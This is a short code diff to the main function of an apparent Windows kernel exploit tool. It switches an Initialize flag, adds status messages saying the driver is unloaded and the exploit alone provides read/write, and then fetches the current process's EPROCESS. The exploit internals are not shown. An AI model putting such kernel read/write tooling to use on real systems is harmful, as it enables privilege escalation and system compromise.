@@ -1,8 +1,9 @@
 #include <Windows.h>
 #include "Kernel.h"
 int main() {
+    printf("-----                                Starting                                     -----\n");
     Kernel exploit;
-    NTSTATUS exploitStatus = exploit.Initialize(false);
+    NTSTATUS exploitStatus = exploit.Initialize(true);
     // Initialize the exploit
     if (exploitStatus) {
         printf("[-] Exploit failed to initialize (%llx)\n", exploitStatus);
@@ -16,6 +17,8 @@ int main() {
             return -1;
         }
     }    
+
+    printf("----- Driver Is unloaded at this point utilizing only the exploit for read/write -----\n");
 
     // Retrieve current process details
     __int64 currentProcess = exploit.EProcess(GetCurrentProcessId());
